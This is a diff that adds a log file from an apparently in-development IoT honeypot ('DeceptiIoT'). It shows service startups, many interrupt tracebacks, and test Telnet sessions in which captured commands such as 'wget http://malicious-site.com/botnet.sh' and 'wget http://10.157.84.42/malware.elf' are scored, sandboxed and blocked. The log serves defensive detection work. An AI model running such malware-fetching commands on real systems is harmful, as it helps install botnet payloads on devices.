@@ -1,0 +1,645 @@
+2025-11-19 18:59:41,434 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 18:59:41,559 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 18:59:41,560 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 19:11:39,064 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-19 19:14:09,844 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 19:14:09,990 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 19:14:09,992 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 19:14:39,637 [INFO] New Telnet connection from 10.108.34.170
+2025-11-19 19:14:39,729 [ERROR] Detection Error: Instance <Event at 0x7fbfbc1a98d0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:14:57,980 [ERROR] Detection Error: Instance <Event at 0x7fbfbc109b10> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:16:03,504 [ERROR] Detection Error: Instance <Event at 0x7fbfbc1083d0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:16:42,087 [ERROR] Detection Error: Instance <Event at 0x7fbfbc1095a0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:16:55,897 [INFO] New Telnet connection from 10.108.34.170
+2025-11-19 19:17:16,515 [ERROR] Detection Error: Instance <Event at 0x7fbfbc1090c0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:17:47,507 [ERROR] Detection Error: Instance <Event at 0x7fbfbc108910> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:17:48,841 [INFO] New Telnet connection from 10.108.34.170
+2025-11-19 19:19:09,540 [ERROR] Detection Error: Instance <Event at 0x7fbfbc1a9ea0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:20:47,279 [ERROR] Detection Error: Instance <Event at 0x7fbfbc109de0> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:21:24,225 [ERROR] Detection Error: Instance <Event at 0x7fbfbc10b730> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:22:14,926 [ERROR] Detection Error: Instance <Event at 0x7fbfbc10ae00> is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: https://sqlalche.me/e/20/bhk3)
+2025-11-19 19:26:06,466 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-19 19:30:43,189 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 19:30:43,361 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 19:30:43,364 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 19:32:32,556 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-19 19:36:44,001 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 19:36:44,080 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 19:36:44,080 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 19:37:19,249 [INFO] New Telnet connection from 10.108.34.170
+2025-11-19 19:38:16,491 [WARNING] CRITICAL THREAT DETECTED FROM 10.108.34.170. Score: 95
+2025-11-19 19:38:16,496 [INFO] Sandboxing payload from 10.108.34.170: wget http://malicious-site.com/botnet.sh
+2025-11-19 19:40:16,070 [ERROR] Detection Error: object str can't be used in 'await' expression
+2025-11-19 19:40:26,973 [INFO] 172.17.0.2 [19/Nov/2025:19:40:26 +0000] "GET /botnet.sh HTTP/1.1" 404 0 "-" "Wget"
+2025-11-19 19:41:52,009 [WARNING] CRITICAL THREAT DETECTED FROM 10.108.34.170. Score: 190
+2025-11-19 19:41:52,018 [INFO] Sandboxing payload from 10.108.34.170: wget http://evil.com
+2025-11-19 19:42:15,397 [ERROR] Detection Error: object str can't be used in 'await' expression
+2025-11-19 19:42:15,649 [INFO] 172.17.0.2 [19/Nov/2025:19:42:15 +0000] "GET / HTTP/1.1" 200 0 "-" "Wget"
+2025-11-19 19:43:51,906 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-19 20:21:50,128 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 20:21:51,103 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 20:21:51,103 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 20:34:29,082 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-19 20:37:51,169 [INFO] HTTP Honeypot active on port 8080
+2025-11-19 20:37:51,297 [INFO] Telnet Honeypot active on port 2323
+2025-11-19 20:37:51,300 [INFO] MQTT Honeypot active on port 1883
+2025-11-19 20:38:35,856 [INFO] New Telnet connection from 10.108.34.170
+2025-11-19 20:38:54,788 [WARNING] CRITICAL THREAT DETECTED FROM 10.108.34.170. Score: 190
+2025-11-19 20:38:54,791 [ERROR] Iptables Error: name 'vert_ip' is not defined
+2025-11-19 20:38:57,729 [WARNING] CRITICAL THREAT DETECTED FROM 10.108.34.170. Score: 190
+2025-11-19 20:38:57,729 [ERROR] Iptables Error: name 'vert_ip' is not defined
+2025-11-19 20:39:07,835 [WARNING] CRITICAL THREAT DETECTED FROM 10.108.34.170. Score: 285
+2025-11-19 20:39:07,921 [INFO] Sandboxing payload from 10.108.34.170: wget http://evil.com
+2025-11-19 20:39:25,326 [ERROR] Sandbox failure for 10.108.34.170: 404 Client Error for http+docker://localhost/v1.50/containers/d8aaee6cb2d451de00ff28918c9bd5c651f9837de4951da7dc8844bfd41fcd87/kill: Not Found ("cannot kill container: d8aaee6cb2d451de00ff28918c9bd5c651f9837de4951da7dc8844bfd41fcd87: No such container: d8aaee6cb2d451de00ff28918c9bd5c651f9837de4951da7dc8844bfd41fcd87")
+2025-11-19 20:39:25,342 [ERROR] Iptables Error: name 'vert_ip' is not defined
+2025-11-19 20:40:50,816 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 18:24:06,635 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 18:24:06,913 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 18:24:06,914 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 18:30:07,167 [INFO] New Telnet connection from 10.157.84.170
+2025-11-20 18:30:40,536 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.170. Score: 95
+2025-11-20 18:30:40,539 [INFO] Sandboxing payload from 10.157.84.170: wget http://evil.com
+2025-11-20 18:30:50,550 [ERROR] Sandbox failure for 10.157.84.170: 404 Client Error for http+docker://localhost/v1.50/containers/94805add05bc860156f12b66cc13a7470debce1903fcd9a05f0a88b914fdcbd1/kill: Not Found ("cannot kill container: 94805add05bc860156f12b66cc13a7470debce1903fcd9a05f0a88b914fdcbd1: No such container: 94805add05bc860156f12b66cc13a7470debce1903fcd9a05f0a88b914fdcbd1")
+2025-11-20 18:30:50,733 [INFO] Blocking malicious IP: 10.157.84.170
+2025-11-20 18:46:37,216 [ERROR] Telnet error: [Errno 110] Connection timed out
+2025-11-20 19:20:03,067 [INFO] New Telnet connection from 10.157.84.42
+2025-11-20 19:23:43,401 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.42. Score: 95
+2025-11-20 19:23:43,407 [INFO] Sandboxing payload from 10.157.84.42: wget http://10.157.84.42/malware.elf
+2025-11-20 19:23:51,472 [INFO] Blocking malicious IP: 10.157.84.42
+2025-11-20 19:34:00,038 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 19:38:29,774 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 19:38:29,839 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 19:38:29,839 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 19:49:54,718 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 19:49:54,972 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 19:49:54,974 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 19:51:02,930 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 19:52:42,632 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 19:52:42,670 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 19:52:42,671 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 19:57:08,214 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 20:02:12,149 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 20:02:12,268 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 20:02:12,268 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 20:06:08,221 [INFO] New Telnet connection from 10.157.84.170
+2025-11-20 20:06:56,574 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.170. Score: 95
+2025-11-20 20:06:56,579 [INFO] Sandboxing payload from 10.157.84.170: wget http://10.157.84.170/hello.elf
+2025-11-20 20:07:04,411 [WARNING] ACTION: Blocking malicious IP: 10.157.84.170
+2025-11-20 20:10:09,000 [ERROR] Task exception was never retrieved
+future: <Task finished name='Task-1' coro=<main() done, defined at /home/deceptiot/DeceptiIoT/main.py:25> exception=KeyboardInterrupt()>
+Traceback (most recent call last):
+  File "/home/deceptiot/DeceptiIoT/main.py", line 50, in <module>
+    asyncio.run(main())
+  File "/usr/lib/python3.10/asyncio/runners.py", line 47, in run
+    _cancel_all_tasks(loop)
+  File "/usr/lib/python3.10/asyncio/runners.py", line 63, in _cancel_all_tasks
+    loop.run_until_complete(tasks.gather(*to_cancel, return_exceptions=True))
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 41, in main
+    await asyncio.gather(
+  File "/usr/lib/python3.10/asyncio/runners.py", line 44, in run
+    return loop.run_until_complete(main)
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 636, in run_until_complete
+    self.run_forever()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 603, in run_forever
+    self._run_once()
+  File "/usr/lib/python3.10/asyncio/base_events.py", line 1909, in _run_once
+    handle._run()
+  File "/usr/lib/python3.10/asyncio/events.py", line 80, in _run
+    self._context.run(self._callback, *self._args)
+  File "/home/deceptiot/DeceptiIoT/main.py", line 23, in start_dashboard
+    await server.serve()
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 70, in serve
+    with self.capture_signals():
+  File "/usr/lib/python3.10/contextlib.py", line 142, in __exit__
+    next(self.gen)
+  File "/home/deceptiot/DeceptiIoT/venv/lib/python3.10/site-packages/uvicorn/server.py", line 331, in capture_signals
+    signal.raise_signal(captured_signal)
+KeyboardInterrupt
+2025-11-20 20:12:55,404 [INFO] HTTP Honeypot active on port 8080
+2025-11-20 20:12:55,459 [INFO] Telnet Honeypot active on port 2323
+2025-11-20 20:12:55,459 [INFO] MQTT Honeypot active on port 1883
+2025-11-20 20:13:15,204 [INFO] New Telnet connection from 10.157.84.42
+2025-11-20 20:14:04,908 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.42. Score: 80
+2025-11-20 20:14:05,027 [WARNING] ACTION: Blocking malicious IP: 10.157.84.42
+2025-11-20 20:14:42,333 [INFO] Unblocking IP: 10.157.84.170
+2025-11-20 20:14:45,955 [INFO] Unblocking IP: 10.157.84.42
+2025-11-20 20:15:13,576 [INFO] New Telnet connection from 10.157.84.170
+2025-11-20 20:15:55,576 [WARNING] CRITICAL THREAT DETECTED FROM 10.157.84.170. Score: 95
+2025-11-20 20:15:55,576 [INFO] Sandboxing payload from 10.157.84.170: wget http://10.157.84.170/hello.elf
+2025-11-20 20:15:59,476 [WARNING] ACTION: Blocking malicious IP: 10.157.84.170
+2025-11-20 20:17:25,307 [INFO] New Telnet connection from 10.157.84.42
